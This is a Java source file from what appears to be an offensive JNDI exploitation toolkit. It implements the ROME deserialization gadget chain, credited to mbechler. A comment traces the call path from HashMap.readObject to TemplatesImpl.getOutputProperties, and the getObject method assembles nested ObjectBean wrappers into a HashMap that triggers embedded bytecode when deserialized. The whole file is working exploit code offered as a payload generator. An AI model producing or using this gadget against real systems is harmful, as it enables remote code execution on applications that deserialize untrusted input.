package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Authors;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.xml.transform.Templates;

/**
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 */

@Dependencies("rome:rome:1.0")
@Authors({Authors.MBECHLER})
public class ROME implements ObjectPayload<Object> {
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        Object                o        = Gadgets.createTemplatesImpl(type, param);
        ObjectBean            delegate = new ObjectBean(Templates.class, o);
        ObjectBean            root     = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }
}
